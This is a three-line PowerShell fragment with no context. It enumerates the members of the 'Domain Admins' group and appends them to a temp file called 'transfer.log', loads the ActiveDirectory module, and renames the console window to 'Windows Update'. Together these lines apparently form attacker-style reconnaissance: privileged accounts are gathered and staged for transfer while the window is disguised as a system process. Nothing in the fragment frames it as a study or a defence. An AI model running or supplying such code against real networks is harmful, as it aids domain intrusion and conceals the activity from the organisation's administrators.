net group "Domain Admins" /domain | Out-File "$env:TEMP\transfer.log" -Append
Import-Module ActiveDirectory
$Host.UI.RawUI.WindowTitle = "Windows Update"
